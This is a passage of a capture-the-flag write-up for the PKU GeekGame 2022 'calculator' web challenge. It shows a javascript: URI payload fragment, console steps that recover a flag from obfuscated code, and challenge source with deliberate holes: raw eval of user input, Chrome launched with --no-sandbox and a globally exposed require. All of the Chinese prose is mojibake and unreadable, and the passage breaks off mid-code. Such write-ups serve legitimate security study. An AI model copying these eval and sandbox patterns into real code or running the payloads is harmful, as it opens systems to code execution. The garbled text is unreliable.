<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token string">'&lt;title&gt;'</span><span class="token operator">+</span>document<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'textContent'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å®ƒç›¸å½“äº <code>document.write</code> åé¢çš„å†…å®¹ã€‚</p>
</blockquote>
<p>ï¼ˆå­¦å¤šï¼Œæ‚¨ä»¬ js å¤ªä¼šç©äº†ï¼</p>
<h3 id="è¿™ä¹Ÿèƒ½å·"><a href="#è¿™ä¹Ÿèƒ½å·" class="headerlink" title="è¿™ä¹Ÿèƒ½å·"></a>è¿™ä¹Ÿèƒ½å·</h3><blockquote>
<blockquote>
<p>æŸå¤§å­¦çš„å¾ˆå¤šè¯¾éƒ½æœ‰ä½œä¸šï¼Œç‰¹åˆ«æ˜¯ç¨‹åºè®¾è®¡è¯¾ç¨‹ï¼Œå¾€å¾€ä¼šè¦æ±‚åŒå­¦ä»¬å†™äº›ç®€å•ç¨‹åºå½“ä½œä¸šã€‚ å¯æƒœï¼Œç°åœ¨å¤§å®¶éƒ½å¾ˆå·ï¼Œè€ƒè¯•æ€»èƒ½å–å¾—æé«˜çš„åˆ†æ•°ï¼Œç”šè‡³å¤§ä½œä¸šä¹Ÿä¼šå·å‡ºæ–°èŠ±æ ·æ¥ã€‚ å€˜è‹¥æŸäººåœ¨ä½œä¸šä¸Šå¼€æ‘†ï¼Œé‚£ä¹ˆç­‰å¾…ä»–çš„å¾€å¾€åªèƒ½æ˜¯ä¸€ä¸ªå¯„å­—ï¼Œè¿™ä¹Ÿæ˜¯æŸå¤§å­¦â€œæ‘†å¯„â€èŠ±åä¹‹ç”±æ¥ã€‚</p>
</blockquote>
<p>ä½ æœ‰ä¸€ä½å®¤å‹ï¼Œä»–çš„å£å¤´ç¦…æ˜¯â€œæˆ‘æ˜¯æ‘†å¤§æœ€æ‘†çš„äººâ€å’Œâ€œæˆ‘ä»ä¸å†…å·â€ã€‚</p>
<p>è¿™ä¸€æ¬¡ï¼Œä»–é€‰ä¿®äº†ä¸€é—¨å«ã€ŠJavaScriptç¨‹åºè®¾è®¡ã€‹çš„è¯¾ç¨‹ã€‚è‡ªä»é€‰ä¿®è¿™é—¨è¯¾ç¨‹åï¼Œä½ å‘ç°ä»– å¤©å¤©ç†¬åˆ°åŠå¤œï¼Œå¯¹ç€VSCodeå‚»ç¬‘ï¼Œå®ä¸ºå¼‚å¸¸ã€‚</p>
<p>ä¸€å¤©ï¼Œä½ åœ¨å¶ç„¶é—´å¬åˆ°äº†ä»–çš„å–ƒå–ƒè‡ªè¯­ï¼šâ€œåªè¦æˆ‘æŠŠå°ä½œä¸šå½“æœŸæœ«ä½œä¸šåšï¼Œå¤§ä½œä¸šå½“æ¯•ä¸šè®¾è®¡åšï¼ŒåŠ¿å¿…èƒ½å·è¿‡å…¶ä»–å·ç‹ï¼â€ å¬åˆ°è¿™ï¼Œæ„Ÿè§‰æ”¶åˆ°äº†æ¬ºéª—çš„ä½ å‹ƒç„¶å¤§æ€’ï¼Œæ‰“å¼€äº†ä»–çš„ç¬¬ä¸€ä¸ªâ€œå°â€ä½œä¸šâ€”â€”ä¸€ä¸ªâ€œç®€å•â€çš„è®¡ç®—å™¨ã€‚</p>
<p>å¦å¤–ï¼Œé€šè¿‡ä¸€é¡¿å®¶å›­ï¼Œä½ è·å¾—äº†ä»–çš„åç«¯æºç ï¼Œ<del>è¿™è®©è¿™é“é¢˜çš„éš¾åº¦å¤§å¤§é™ä½ã€‚</del></p>
<p>ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob09-manager.geekgame.pku.edu.cn/docker-manager/start?xxxxxxx">è®¿é—®é¢˜ç›®ç½‘é¡µ</a> </p>
<p>ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob09/prob09-src.tar.gz">ä¸‹è½½é¢˜ç›®æºç </a></p>
</blockquote>
<h4 id="Flag-Â·-æ‘†"><a href="#Flag-Â·-æ‘†" class="headerlink" title="Flag Â· æ‘†"></a>Flag Â· æ‘†</h4><p>è®¿é—® <code>/premium.html</code>ï¼Œæœ‰ä¸ª <code>premium.js</code>ï¼Œé‡Œé¢æ˜¯æ··æ·†åçš„ä»£ç ï¼Œå…¶ä¸­è¿˜æœ‰ debugger å¡æ­»è°ƒè¯•çª—å£çš„</p>
<p>è¿™é‡Œç›´æ¥è·³è¿‡æ–­ç‚¹</p>
<p>é‡Œé¢æœ‰ä¸ª flag0 å¸¸é‡ï¼Œç›´æ¥åœ¨ console é‡Œæ‰§è¡Œåé¢çš„è¿™æ®µ</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">_0x340c07</span><span class="token punctuation">(</span><span class="token number">0x65d</span><span class="token punctuation">,</span> <span class="token string">'aIlf'</span><span class="token punctuation">,</span> <span class="token number">0x554</span><span class="token punctuation">,</span> <span class="token number">0x7bc</span><span class="token punctuation">,</span> <span class="token number">0x7c0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x340c07</span><span class="token punctuation">(</span><span class="token number">0x522</span><span class="token punctuation">,</span> <span class="token string">'mxb3'</span><span class="token punctuation">,</span> <span class="token number">0x41a</span><span class="token punctuation">,</span> <span class="token number">0x61d</span><span class="token punctuation">,</span> <span class="token number">0x5ed</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'Zml('</span><span class="token punctuation">,</span> <span class="token number">0x605</span><span class="token punctuation">,</span> <span class="token number">0x57c</span><span class="token punctuation">,</span> <span class="token number">0x6a1</span><span class="token punctuation">,</span> <span class="token number">0x5a5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'UwsG'</span><span class="token punctuation">,</span> <span class="token number">0x5d6</span><span class="token punctuation">,</span> <span class="token number">0x5c1</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token number">0x601</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x5e5705</span><span class="token punctuation">(</span><span class="token string">'mmNu'</span><span class="token punctuation">,</span> <span class="token number">0x1d0</span><span class="token punctuation">,</span> <span class="token number">0x354</span><span class="token punctuation">,</span> <span class="token number">0x339</span><span class="token punctuation">,</span> <span class="token number">0x1d1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'][gJ'</span><span class="token punctuation">,</span> <span class="token number">0x3b3</span><span class="token punctuation">,</span> <span class="token number">0x4c7</span><span class="token punctuation">,</span> <span class="token number">0x43a</span><span class="token punctuation">,</span> <span class="token number">0x401</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°±èƒ½æ‹¿åˆ°ç¬¬ä¸€ä¸ª flag äº†ï¼</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124040440724.png"></p>
<p><code>flag{fr0nt3nd_log1c_m4tters}</code></p>
<h4 id="Flag-Â·-å¤§"><a href="#Flag-Â·-å¤§" class="headerlink" title="Flag Â· å¤§"></a>Flag Â· å¤§</h4><p>åé¢ä¸¤ä¸ª flag çœ‹ä»–ç»™çš„åç«¯æºç ï¼Œåº”è¯¥æ˜¯ â€˜nodeâ€™, â€˜browserâ€™ å„æœ‰ä¸€ä¸ª</p>
<p>å¤§æ¦‚ç‡æ˜¯ nodejs åŸå‹é“¾æ±¡æŸ“ä¸€ä¸ªï¼Œå¯èƒ½æ˜¯ RCEï¼Ÿ</p>
<p>å¦ä¸€ä¸ªå°±æ˜¯ chrome browserï¼Œè®¿é—® <code>sandbox.html</code> è·å–å…¶ä¸­çš„ flag å¸¸é‡ã€‚</p>
<p><code>sandbox.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> launch <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'puppeteer'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> pathToFileURL <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'url'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> promisify <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'util'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> execFile <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'child_process'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> resolve <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">NODE_PATH</span><span class="token punctuation">,</span> <span class="token constant">ROOT_DIR</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./misc.js'</span>
<span class="token keyword">const</span> execFileAsync <span class="token operator">=</span> <span class="token function">promisify</span><span class="token punctuation">(</span>execFile<span class="token punctuation">)</span>
<span class="token keyword">const</span> sandboxUrl <span class="token operator">=</span> <span class="token function">pathToFileURL</span><span class="token punctuation">(</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span> <span class="token string">'sandbox.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>href

<span class="token comment">/**
 * @param {string} expr
 */</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runInNodeSandbox</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> args <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'--experimental-policy=policy.json'</span><span class="token punctuation">,</span>
    <span class="token string">'--policy-integrity=sha256-1NvUvTeQqHoo+XJv7zUAobD/VEaIGQ8CB3471GP2isY='</span><span class="token punctuation">,</span>
    <span class="token string">'runner.js'</span><span class="token punctuation">,</span>
    <span class="token string">'-e='</span> <span class="token operator">+</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">execFileAsync</span><span class="token punctuation">(</span><span class="token constant">NODE_PATH</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>
    <span class="token literal-property property">cwd</span><span class="token operator">:</span> <span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span>
    <span class="token literal-property property">shell</span><span class="token operator">:</span> <span class="token boolean">false</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * @param {string} expr
 */</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runInBrowserSandbox</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">executablePath</span><span class="token operator">:</span> <span class="token string">'google-chrome-stable'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>sandboxUrl<span class="token punctuation">)</span>
    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">throw</span> err
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124040958439.png" alt="sandbox.html"></p>
<p><code>index.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> fastify <span class="token keyword">from</span> <span class="token string">'fastify'</span>
<span class="token keyword">import</span> fastifyStatic <span class="token keyword">from</span> <span class="token string">'@fastify/static'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> join <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> runInNodeSandbox<span class="token punctuation">,</span> runInBrowserSandbox <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./sandbox.js'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">ROOT_DIR</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./misc.js'</span>

<span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">fastify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

server<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>
  <span class="token string">'/submit'</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">schema</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'object'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">properties</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">expr</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'string'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">pattern</span><span class="token operator">:</span> <span class="token string">'^([a-z0-9+\\-*/%(), ]|([0-9]+[.])+[0-9]+)+$'</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token keyword">enum</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'browser'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">required</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'expr'</span><span class="token punctuation">,</span> <span class="token string">'mode'</span><span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// @ts-ignore</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> expr<span class="token punctuation">,</span> mode <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'node'</span>
      <span class="token operator">?</span> <span class="token function">runInNodeSandbox</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
      <span class="token operator">:</span> <span class="token function">runInBrowserSandbox</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span> result <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span>

server<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>fastifyStatic<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'frontend'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">'0.0.0.0'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>runner.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">typeof</span> e <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> arg <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> str<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'-e='</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arg<span class="token punctuation">)</span> process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> expression <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>arg<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>misc.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> fileURLToPath <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'url'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> dirname <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> createRequire <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'module'</span>
<span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">fileURLToPath</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">.</span>meta<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">ROOT_DIR</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">NODE_PATH</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>execPath
globalThis<span class="token punctuation">.</span>require <span class="token operator">=</span> <span class="token function">createRequire</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‰ç«¯è¿™é‡Œæœ‰ä¸ª premium user ç›¸å…³çš„</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124041453731.png"></p>
<p>æŠŠ <code>main-premium.js</code> ä¸‹è½½ä¸‹æ¥</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> backend <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'backend'</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> option <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'option'</span><span class="token punctuation">)</span>
  option<span class="token punctuation">.</span>value <span class="token operator">=</span> value
  option<span class="token punctuation">.</span>textContent <span class="token operator">=</span> name
  backend<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'Node.JS'</span><span class="token punctuation">)</span>
<span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token string">'browser'</span><span class="token punctuation">,</span> <span class="token string">'Browser'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.calc-btn'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>
  <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> e<span class="token punctuation">.</span>textContent<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'='</span>
<span class="token punctuation">)</span>
<span class="token keyword">const</span> submit <span class="token operator">=</span> original<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
submit<span class="token punctuation">.</span>style<span class="token punctuation">.</span>background <span class="token operator">=</span> <span class="token string">'#9b59b6'</span>
submit<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'white'</span>
original<span class="token punctuation">.</span><span class="token function">replaceWith</span><span class="token punctuation">(</span>submit<span class="token punctuation">)</span>

<span class="token keyword">const</span> display <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.display'</span><span class="token punctuation">)</span>
submit<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> expr <span class="token operator">=</span> display<span class="token punctuation">.</span>value
  display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'Calculating...'</span>
  <span class="token keyword">const</span> mode <span class="token operator">=</span> backend<span class="token punctuation">.</span>value
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'browser'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>mode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> expr<span class="token punctuation">,</span> mode <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'Error'</span>
  <span class="token punctuation">}</span>
